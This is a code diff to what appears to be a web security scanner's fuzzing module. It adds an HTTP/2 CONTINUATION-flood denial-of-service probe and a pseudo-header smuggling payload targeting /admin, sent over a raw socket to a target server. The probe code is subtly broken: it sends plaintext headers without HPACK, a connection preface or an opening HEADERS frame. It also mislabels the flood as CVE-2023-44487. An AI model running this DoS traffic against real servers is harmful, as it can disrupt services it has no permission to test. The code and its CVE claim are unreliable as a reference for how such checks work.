@@ -27,6 +27,7 @@ from typing import Any
 from urllib.parse import urlparse
 
 import httpx
+import struct
 
 from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
 from src.core.utils.url_validation import is_safe_url_with_dns_check
@@ -274,6 +275,110 @@ def _chunked_payloads() -> list[dict[str, Any]]:
 # Public API
 # ---------------------------------------------------------------------------
 
+def _build_continuation_frame(stream_id: int, header_block: bytes) -> bytes:
+    length = len(header_block) & 0x00FFFFFF
+    header = struct.pack(">I", length)[1:]
+    header += struct.pack(">B", 0x09)
+    header += struct.pack(">B", 0x00)
+    header += struct.pack(">I", stream_id & 0x7FFFFFFF)
+    return header + header_block
+
+
+def _h2_continuation_flood_payloads() -> list[dict[str, Any]]:
+    p1_header_block = (":method GET\r\n:path /\r\n:scheme http\r\n" * 4).encode("latin-1")
+    p2_header_block = (":authority target\r\n:method GET\r\n:path /admin\r\n\r\n:method GET\r\n".encode("latin-1"))
+    return [
+        {
+            "label": "h2_continuation_flood_cve_2023_44487",
+            "header_block": p1_header_block,
+        },
+        {
+            "label": "h2_pseudo_header_smuggle",
+            "header_block": p2_header_block,
+        },
+    ]
+
+
+async def _fuzz_h2_continuation_flood(
+    url: str,
+    host: str,
+    endpoint_key: str,
+    base_endpoint: str,
+    endpoint_type: str,
+    *,
+    timeout_seconds: float,
+) -> list[dict[str, Any]]:
+    findings: list[dict[str, Any]] = []
+    parsed = urlparse(url)
+    port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    ssl_ctx: ssl.SSLContext | None = None
+    if parsed.scheme == "https":
+        ssl_ctx = ssl.create_default_context()
+    try:
+        if ssl_ctx is not None:
+            reader, writer = await asyncio.open_connection(host=host, port=port, ssl=ssl_ctx, server_hostname=host)
+        else:
+            reader, writer = await asyncio.open_connection(host=host, port=port)
+    except Exception:
+        return findings
+    try:
+        frames = b""
+        cases = _h2_continuation_flood_payloads()
+        for case in cases:
+            header_block = case["header_block"]
+            for _ in range(60):
+                frames += _build_continuation_frame(1, header_block)
+        writer.write(frames)
+        await writer.drain()
+        resp = await _read_http_response(reader, timeout=timeout_seconds)
+    except Exception as exc:
+        logger.debug("h2 continuation flood raw read failed: %s", exc)
+        resp = {"error": str(exc)}
+    finally:
+        try:
+            writer.close()
+        except Exception:
+            pass
+    status_code = resp.get("status_code", 0)
+    body = resp.get("body", b"")
+    body_text = body[:400].decode("latin-1", errors="replace") if isinstance(body, (bytes, bytearray)) else ""
+    evidence = {
+        "status_code": status_code,
+        "body_preview": body_text,
+        "frames_sent": 120,
+        "reason": "HTTP/2 CONTINUATION flood without END_HEADERS",
+    }
+    if status_code >= 500 or "memory" in body_text.lower() or "overflow" in body_text.lower() or "continuation" in body_text.lower():
+        findings.append(
+            {
+                "url": url,
+                "endpoint_key": endpoint_key,
+                "endpoint_base_key": base_endpoint,
+                "endpoint_type": endpoint_type,
+                "issues": ["h2_continuation_flood_memory_exhaustion", "h2_cve_2023_44487_continuation_dos"],
+                "probe_type": "framing_fuzzer",
+                "severity": "critical",
+                "confidence": 0.85,
+                "evidence": evidence,
+            }
+        )
+    elif status_code in (200, 201) and ("continuation" in body_text.lower() or "h2" in body_text.lower()):
+        findings.append(
+            {
+                "url": url,
+                "endpoint_key": endpoint_key,
+                "endpoint_base_key": base_endpoint,
+                "endpoint_type": endpoint_type,
+                "issues": ["h2_continuation_flood_pseudo_header_smuggle"],
+                "probe_type": "framing_fuzzer",
+                "severity": "high",
+                "confidence": 0.65,
+                "evidence": evidence,
+            }
+        )
+    return findings
+
+
 async def run_framing_fuzzing_campaign(
     url: str,
     client: httpx.AsyncClient | None = None,
@@ -307,6 +412,9 @@ async def run_framing_fuzzing_campaign(
     )
     findings.extend(
         await _fuzz_chunked(url, host, endpoint_key, base_endpoint, endpoint_type, timeout_seconds=timeout_seconds)
+    )
+    findings.extend(
+        await _fuzz_h2_continuation_flood(url, host, endpoint_key, base_endpoint, endpoint_type, timeout_seconds=timeout_seconds)
     )
     return findings
 
